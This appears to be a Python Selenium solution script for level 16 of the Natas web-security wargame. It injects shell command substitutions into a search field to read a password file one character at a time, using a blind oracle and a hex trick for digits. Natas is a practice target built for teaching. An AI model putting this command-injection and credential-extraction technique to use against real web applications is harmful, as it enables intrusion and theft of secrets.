from common import *
'^$(cut -c 2-2 /etc/natas_webpass/natas17)'

def solve(driver, last_password):
    driver.get(build_url(level=16))
    
    password = ""
    for x in range(len(last_password)): # all passwords are the same length
        # ask for words starting with the x letter of the password
        driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(f'^$(cut -c {x+1}-{x+1} {build_webpass_path(17)})')
        driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()

        WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]/pre'))
        results = driver.find_element(By.XPATH, '//*[@id="content"]/pre').text.split()
        if len(results) == 0:
            # it's a number, we're gonna convert to hex after adding 5 or 10, and try again. if it's still empty, it's an error
            for j in [5,10]:
                driver.find_element(By.XPATH, '//*[@id="content"]/form/input[1]').send_keys(f'^$(printf %x $(expr {j} + $(cut -c {x+1}-{x+1} {build_webpass_path(17)})))')
                driver.find_element(By.XPATH, '//*[@id="content"]/form/input[2]').click()
                
                WebDriverWait(driver, 10).until(lambda driver: driver.find_element(By.XPATH, '//*[@id="content"]/pre'))
                results = driver.find_element(By.XPATH, '//*[@id="content"]/pre').text.split()
                if len(results) != 0:
                    letter = results[0][0]
                    number = int(letter, 16) - j
                    password += str(number)
                    break
            else:
                raise RuntimeError(f"Could not find letter {x} of the password, seems to be a number but hex method isn't working.")
            
        else:
            password += results[0][0]
        print("password: ", password, end = '\r')
    print()
    
    driver.get(build_url(password = password, level=17))
    return password